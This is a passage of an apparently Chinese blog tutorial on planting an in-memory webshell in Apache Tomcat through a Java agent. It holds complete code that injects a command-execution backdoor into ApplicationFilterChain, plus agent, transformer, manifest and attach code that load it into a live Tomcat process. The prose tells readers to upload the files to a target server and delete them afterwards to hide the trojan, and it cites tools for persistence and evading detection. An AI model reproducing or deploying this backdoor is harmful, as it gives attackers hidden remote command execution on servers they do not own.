class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, IOException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> <span class="string">&quot;internalDoFilter&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> <span class="string">&quot;String command = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            if (command != null) &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                try &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    java.io.PrintWriter printWriter = response.getWriter();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    String o = \&quot;\&quot;;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    ProcessBuilder p;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    if (System.getProperty(\&quot;os.name\&quot;).toLowerCase().contains(\&quot;win\&quot;)) &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        p = new ProcessBuilder(new String[]&#123;\&quot;cmd.exe\&quot;, \&quot;/c\&quot;, command&#125;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &#125; else &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        p = new ProcessBuilder(new String[]&#123;\&quot;/bin/sh\&quot;, \&quot;-c\&quot;, command&#125;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    o = c.hasNext() ? c.next() : o;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    c.close();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    printWriter.write(o);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    printWriter.flush();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    printWriter.close();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(className);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctClass.getDeclaredMethod(methodName);</span><br><span class="line"></span><br><span class="line">        method.insertBefore(evilCode);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;output.bin&quot;</span>);</span><br><span class="line">        fos.write(ctClass.toBytecode());</span><br><span class="line"></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1694519202886.png"></p><ol start="2"><li>再在本地创建好 <code>agent.jar</code></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>agent-demo03<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>agent-demo03 Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--   跳过单元测试     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.test.skip</span>&gt;</span>true<span class="tag">&lt;/<span class="name">maven.test.skip</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 自定义MANIFEST.MF --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.configuration.manifestFile</span>&gt;</span>src/main/resources/MANIFEST.MF<span class="tag">&lt;/<span class="name">maven.configuration.manifestFile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.29.2-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>D:\Java\jdk1.8.0_202\lib\tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--       就是把前面的配置的MANIFEST.MF打入jar中，以指定premain的位置，否则会报：</span></span><br><span class="line"><span class="comment">                         Failed to find Premain-Class manifest attribute in</span></span><br><span class="line"><span class="comment">            --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">manifestFile</span>&gt;</span>$&#123;maven.configuration.manifestFile&#125;<span class="tag">&lt;/<span class="name">manifestFile</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">MyTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clz:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clz.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clz&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName)) &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 这里填前面恶意类字节码文件上传到目标服务器的位置，同agent.jar的方式</span></span><br><span class="line">                fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\output.bin&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((len = fis.read(buffer)) == -<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0  </span><br><span class="line">Can-Redefine-Classes: true  </span><br><span class="line">Can-Retransform-Classes: true  </span><br><span class="line">Agent-Class: com.example.AgentMain</span><br></pre></td></tr></table></figure><p>然后利用 <code>Maven.Lifecycle.package</code> 工具打为 <code>jar</code> 包。</p><p><img src="/imgs/1694519422539.png"></p><ol start="3"><li>将刚刚生成的 <code>output.bin</code> 和 <code>agent.jar</code> 上传到目标服务器。这里就是复制到我本地的 <code>D</code> 盘根目录。</li></ol><p><img src="/imgs/1694519629968.png"></p><ol start="4"><li>攻击方运行注入进程的代码。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttachTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> AgentLoadException, IOException, AgentInitializationException, AttachNotSupportedException &#123;  </span><br><span class="line">        <span class="comment">// 获取正在运行 JVM 列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 遍历列表  </span></span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor descriptor : list) &#123;  </span><br><span class="line">            <span class="comment">// 根据进程名字获取进程ID, 并使用 loadAgent 注入进程</span></span><br><span class="line">            <span class="keyword">if</span> (descriptor.displayName().contains(<span class="string">&quot;catalina&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;开始注入&quot;</span>);</span><br><span class="line">                System.out.println(descriptor.displayName());</span><br><span class="line">                System.out.println(descriptor.id());</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(descriptor.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;D:\\agent-demo03-1.0-SNAPSHOT.jar&quot;</span>, <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就成功注入内存马了。</p><p><img src="/imgs/1694520005176.png"></p><p><img src="/imgs/1694519983245.png"></p><p><img src="/imgs/1694519937771.png"></p><ol start="6"><li>注入内存马后别忘了删掉 <code>agent.jar</code> 和 <code>output.bin</code> 来隐藏木马。</li></ol><h1 id="内存马在反序列化漏洞环境中的具体使用"><a href="#内存马在反序列化漏洞环境中的具体使用" class="headerlink" title="内存马在反序列化漏洞环境中的具体使用"></a>内存马在反序列化漏洞环境中的具体使用</h1><p>在反序列化中，一次只能打入一个类（不能同时打入内部类），因此上面的 <code>poc</code> 都需要修改一下，例如在动态注入 <code>servlet</code> 的时候，不能在代码里面 <code>new Servlet()&#123; xxx &#125;</code> ，因为这是一个内部类，就会报错 <code>No Class Define Found</code> 。因此我们需要直接让 <code>poc</code> 本身就是一个 <code>Servlet</code> 。<br>需要注意的是，由于我们在反序列化实例化 <code>poc</code> 的时候就会调用内存马的代码，而在这个代码中又实例化了本身，这会导致死循环。因此我们需要让 <code>poc</code> 多一个有参构造函数，在空参构造函数中注入内存马时，实例化 <code>Servlet</code> 的时候就不要走空参构造函数了。</p><p>具体结合反序列化注入内存马的代码我放在了 <code>github</code> 上面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/justdoit-cai/java_memshell</span><br></pre></td></tr></table></figure><h1 id="内存马的查杀"><a href="#内存马的查杀" class="headerlink" title="内存马的查杀"></a>内存马的查杀</h1><p>工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/4ra1n/shell-analyzer</span><br></pre></td></tr></table></figure><p><img src="/imgs/1694770246768.png"></p><h1 id="内存马的持久化"><a href="#内存马的持久化" class="headerlink" title="内存马的持久化"></a>内存马的持久化</h1><p>参考 <code>https://github.com/threedr3am/ZhouYu</code> 项目实现了内存马的 <strong>持久化</strong> 和 <strong>反查杀</strong> 。</p><ol><li><p><code>ZhouYu</code> 带来新的 <code>webshell</code> 写入手法，通过 <code>javaagent</code> ，利用 <code>JVMTI</code> 机制，在回调时重写 <code>class</code> 类，插入 <code>webshell</code>，并通过阻止后续 <code>javaagent</code> 加载的方式，防止 <code>webshell</code> 被查杀。</p></li><li><p>修改的 <code>class</code> 类插入 <code>webshell</code> 后，通过持久化到 <code>jar</code> 进行 <code>class</code> 替换，达到 <code>webshell</code> 持久化，任你如何重启都无法甩掉。</p></li></ol><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># java内存马完整的介绍</span><br><span class="line">https://xz.aliyun.com/t/11003#toc-0</span><br><span class="line"># tomcat中的WebappClassLoaderBase.getResources()方法为什么被废弃了</span><br><span class="line">https://dato.chequeado.com/docs/changelog.html</span><br><span class="line"># 如何从ThreadLocal中获取StandardContext</span><br><span class="line">https://www.yuque.com/tianxiadamutou/zcfd4v/tzcdeb</span><br><span class="line"># 如何通过MBean获取StandardContext</span><br><span class="line">https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g</span><br><span class="line"># dispatcherType的解释1</span><br><span class="line">http://c.biancheng.net/servlet2/filter.html</span><br><span class="line"># dispatcherType的解释2</span><br><span class="line">http://blog.zollty.com/b/archive/the-filter-and-dispatcher-type-of-spring-or-servlet-3.html</span><br><span class="line"># Filter内存马实现1</span><br><span class="line">https://www.cnblogs.com/nice0e3/p/14622879.html#connector</span><br><span class="line"># Filter内存马实现2</span><br><span class="line">https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na#34bb9bc2</span><br><span class="line"># Listener的使用</span><br><span class="line">https://www.liaoxuefeng.com/wiki/1252599548343744/1304266123771937</span><br><span class="line"># 高版本（2.6及以后）的SpringBoot内存马实现</span><br><span class="line">https://boogipop.com/2023/03/02/SpringBoot3.x%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/#SpringBoot2-6%E4%B9%8B%E5%90%8E%E7%9A%84%E6%94%B9%E5%8A%A8</span><br><span class="line"># 高版本SpringBoot的controller内存马和低版本不一样的原因</span><br><span class="line">https://9bie.org/index.php/archives/953/</span><br><span class="line"># 官网的说明</span><br><span class="line">https://spring.io/blog/2020/06/30/url-matching-with-pathpattern-in-spring-mvc</span><br><span class="line"># 比对调试法解决SpringBoot版本问题</span><br><span class="line">https://www.jianshu.com/p/4500b61384f8</span><br><span class="line"># github的版本更新说明</span><br><span class="line">https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.6-Release-Notes</span><br><span class="line"># Java agent修改 doFilter 